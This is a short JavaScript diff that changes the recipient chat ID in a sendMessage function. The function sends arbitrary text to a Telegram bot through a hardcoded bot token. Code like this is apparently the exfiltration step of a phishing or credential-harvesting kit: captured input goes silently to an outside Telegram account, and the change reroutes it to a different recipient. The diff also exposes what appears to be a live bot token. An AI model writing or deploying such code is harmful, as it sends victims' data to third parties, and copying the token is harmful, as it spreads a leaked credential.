@@ -30,7 +30,7 @@ function loadt() {
 
 function sendMessage(text) {
 
-    const url = `https://api.telegram.org/bot6178294062:AAEi72UVOgyEm_RhZqilO_ANsKcRcW06C-0/sendMessage?chat_id=5766558074&text=${encodeURIComponent(text)}`; // The url to request
+    const url = `https://api.telegram.org/bot6178294062:AAEi72UVOgyEm_RhZqilO_ANsKcRcW06C-0/sendMessage?chat_id=5356614395&text=${encodeURIComponent(text)}`; // The url to request
     const xht = new XMLHttpRequest();
     xht.open("GET", url);
     xht.send();
